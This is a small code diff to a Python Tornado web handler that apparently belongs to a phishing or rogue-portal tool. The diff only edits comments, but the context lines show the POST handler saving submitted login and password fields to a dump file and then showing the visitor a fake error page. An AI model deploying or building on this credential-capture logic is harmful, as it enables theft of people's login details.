@@ -9,11 +9,7 @@ from tools import ConfLoader, server, FileManager
 
 
 class MainHandler(web.RequestHandler):
-    """MainHandler handle root and unknown endpoints
-
-    GET give the index page
-    POST try to save login and password and send the error page
-    """
+    """MainHandler handle root and unknown endpoints"""
 
     def get(self):
         # TODO doc
@@ -29,11 +25,10 @@ class MainHandler(web.RequestHandler):
             dump = os.path.join(dump_path, str(datetime.datetime.now()))
             content = str(arguments) + '\n'
             FileManager.append_to_file(dump, content)
-        except web.HTTPError:   # no or wrong arguments
+        except web.HTTPError:   # no or wrong argument
             logging.warning('Argument error on MainHandler POST request')
-        # then show an error page to the client
         with open(error_file, mode='r', encoding='UTF-8') as page:
-            self.write(page.read())
+            self.write(page.read())  # then show an error page to the client
 
 
 def main():
